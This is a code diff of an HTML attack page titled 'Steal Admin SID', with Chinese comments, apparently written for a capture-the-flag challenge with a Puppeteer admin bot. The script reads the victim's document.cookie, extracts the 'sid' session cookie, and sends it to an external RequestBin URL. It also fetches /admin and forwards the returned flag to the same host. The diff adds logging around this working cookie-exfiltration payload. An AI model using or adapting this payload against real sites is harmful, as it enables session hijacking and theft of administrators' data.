@@ -3,43 +3,99 @@
 <head>
     <meta charset="UTF-8">
     <title>Steal Admin SID</title>
+    <style>
+        /* 简单样式，让页面打印的内容更清晰 */
+        body { font-family: monospace; font-size: 14px; color: #333; padding: 20px; }
+        .log { margin: 8px 0; padding: 6px; border-left: 3px solid #666; }
+        .success { color: #28a745; border-left-color: #28a745; }
+        .error { color: #dc3545; border-left-color: #dc3545; }
+        .info { color: #17a2b8; border-left-color: #17a2b8; }
+    </style>
 </head>
 <body>
+    <div id="logContainer"></div>
+
 <script>
+    // 辅助函数：页面可视打印（在页面上显示日志，方便调试）
+    function printToPage(text, type = 'info') {
+        const logContainer = document.getElementById('logContainer');
+        const logItem = document.createElement('div');
+        logItem.className = `log ${type}`;
+        logItem.innerText = `[${new Date().toLocaleTimeString()}] ${text}`;
+        logContainer.appendChild(logItem);
+        // 同时打印到浏览器控制台
+        console.log(`[StealSID] ${text}`);
+    }
+
     // 核心1：读取document.cookie中的sid（适配sid在cookie中的格式：sid=xxx; 其他键=xxx）
     function getAdminSid() {
+        printToPage('开始读取document.cookie...', 'info');
+        printToPage(`当前所有Cookie：${document.cookie || '无Cookie'}`);
+        
         const cookies = document.cookie.split('; ');
         for (let cookie of cookies) {
             const [key, value] = cookie.split('=');
+            printToPage(`检测到Cookie：${key}=${value}`);
             if (key === 'sid') {
+                printToPage('成功提取到sid！', 'success');
                 return value; // 提取纯sid值，去掉多余字符
             }
         }
+        printToPage('未找到sid Cookie', 'error');
         return 'sid_not_found'; // 容错：未读取到sid时返回标识
     }
 
     // 核心2：获取sid并发送到攻击者的RequestBin
     const adminSid = getAdminSid();
+    // 替换成你的RequestBin地址
     const attackerUrl = `http://www.requestbin.cn:80/1fn11tu1?admin_sid=${encodeURIComponent(adminSid)}`;
+    
+    printToPage(`准备发送sid到攻击者地址：${attackerUrl}`, 'info');
     // 发送GET请求，将sid拼接到URL参数，无跨域限制
     fetch(attackerUrl, {
         method: 'GET',
         mode: 'no-cors', // 关键：避免Puppeteer报跨域错误
         cache: 'no-cache'
+    }).then(() => {
+        printToPage('sid发送请求已发出！', 'success');
+    }).catch(err => {
+        printToPage(`sid发送失败：${err.message}`, 'error');
+        console.error(err);
     });
-    echo "获取sid并发送到攻击者的RequestBin";
+
     // 额外：同时尝试直接访问/admin拿FLAG，一步到位（可选，不影响sid窃取）
+    printToPage('尝试访问本地/admin接口获取FLAG...', 'info');
     fetch('/admin', {mode: 'no-cors'})
-        .then(res => res.text().catch(() => 'no_flag'))
+        .then(res => {
+            printToPage(`/admin接口响应状态：${res.status} ${res.statusText}`, 'info');
+            return res.text().catch(() => 'no_flag');
+        })
         .then(flag => {
             if (flag !== 'no_flag') {
-                fetch(`http://www.requestbin.cn:80/1fn11tu1?admin_sid=${encodeURIComponent(adminSid)}&flag=${encodeURIComponent(flag)}`, {
+                printToPage('成功获取到FLAG！', 'success');
+                printToPage(`获取到的FLAG：${flag}`, 'success');
+                // 发送sid+FLAG到攻击者地址
+                const flagUrl = `http://www.requestbin.cn:80/1fn11tu1?admin_sid=${encodeURIComponent(adminSid)}&flag=${encodeURIComponent(flag)}`;
+                fetch(flagUrl, {
                     method: 'GET',
-                    mode: 'no-cors'
+                    mode: 'no-cors',
+                    cache: 'no-cache'
+                }).then(() => {
+                    printToPage('sid+FLAG已发送到攻击者地址！', 'success');
+                }).catch(err => {
+                    printToPage(`FLAG发送失败：${err.message}`, 'error');
                 });
+            } else {
+                printToPage('未获取到FLAG内容', 'error');
             }
+        })
+        .catch(err => {
+            printToPage(`访问/admin接口失败：${err.message}`, 'error');
+            console.error(err);
         });
-    echo "尝试直接访问/admin拿FLAG，一步到位";
+
+    // 最终打印汇总信息
+    printToPage(`本次操作汇总：sid=${adminSid}`, 'info');
 </script>
 </body>
 </html>
